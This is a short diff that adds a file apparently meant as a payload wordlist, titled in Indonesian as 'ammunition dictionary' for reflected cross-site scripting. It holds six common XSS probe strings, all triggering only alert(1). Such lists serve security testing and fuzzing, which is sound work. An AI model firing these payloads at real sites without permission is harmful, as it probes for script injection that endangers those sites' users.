@@ -1,0 +1,7 @@
+# === KAMUS AMUNISI V8: REFLECTED XSS ===
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+" onerror="alert(1)
+' onerror='alert(1)
+javascript:alert(1)
+<svg/onload=alert(1)>
